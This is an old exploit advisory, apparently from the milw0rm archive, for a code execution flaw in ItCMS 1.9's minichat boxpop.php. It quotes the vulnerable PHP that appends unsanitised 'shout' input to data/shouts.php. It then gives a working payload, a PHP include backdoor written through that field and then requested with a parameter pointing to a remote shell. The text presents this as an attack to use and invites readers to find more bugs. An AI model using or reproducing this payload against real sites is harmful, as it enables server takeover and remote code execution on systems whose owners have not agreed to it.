<html><head><title>ItCMS 1.9 (boxpop.php) Remote Code Execution Vulnerability</title></head><pre>#===========================================================================================================================#
#                                     _ ____             _        _ _                _                                      #
#                          __ ___  __| |__ /_ _ ___     | |_  ___| | |_____ __ _____| |__       ___ _  _                    #
#                         / _/ _ \/ _` ||_ \ '_|_ /  _  | ' \/ -_) | / _ \ V  V / -_) '_ \  _  / -_) || |                   #
#                         \__\___/\__,_|___/_| /__| (_) |_||_\___|_|_\___/\_/\_/\___|_.__/ (_) \___|\_,_|                   #
#===========================================================================================================================#
#                                              ItCMS 1.9 Remote File Rewriting                                              #
#===========================================================================================================================#
#                                                      Author : Cod3rZ                                                      #
#===========================================================================================================================#
#                                              Site : http://cod3rz.helloweb.eu                                             #
#                                          Site : http://devilsnight.altervista.org                                         #
#===========================================================================================================================#
# Remote File Rewriting:                                                                                                    #
#===========================================================================================================================#
# /box/minichat/boxpop.php                                                                                                  #
#===========================================================================================================================#
# if ($_POST[&quot;shout&quot;]!=&quot;&quot;){                                                                                                 #
# $shout = $_POST['shout'];                                                                                           	    #
# } else if ($_GET[&quot;shout&quot;]!=&quot;&quot;){                                                                                           #
# $shout = $_GET[&quot;shout&quot;];                                                                                            	    #
# }                                                                                                                         #
# [...]                                                                                                                     #
# $shout = trim($shout);                                                                                                    #
# $shout = stripslashes($shout);                                                                                            #
# $shout = str_replace (&quot;\r\n&quot;, &quot; [br] &quot;, $shout);                                                                          #
# $shout = first($shout);                                                                                                   #
# [...]                                                                                                                     #
# $FileName=&quot;data/shouts.php&quot;;                                                                                              #
# if($FilePointer=fopen($FileName, &quot;a+&quot;)){                                                                                  #
# fwrite($FilePointer,&quot;$name|^|$shout|^|$date|^|$time|^|$_SERVER[REMOTE_ADDR]|^|\n&quot;);                                       #
# fclose($FilePointer);                                                                                                     #
#===========================================================================================================================#
# So, we can write a malicious code like &lt;?php include($_GET['rfi']); ?&gt; in the variable $shout,                            #
# and then we go in data/shouts.php?rfi=[shell]                                                                             #
#===========================================================================================================================#
# There are many other bugs, find it yourself                                                                               #
#===========================================================================================================================#
# Devils Night Corporation - http://devilsnight.altervista.org                                                              #
#===========================================================================================================================#

# milw0rm.com [2008-05-02]</pre></html>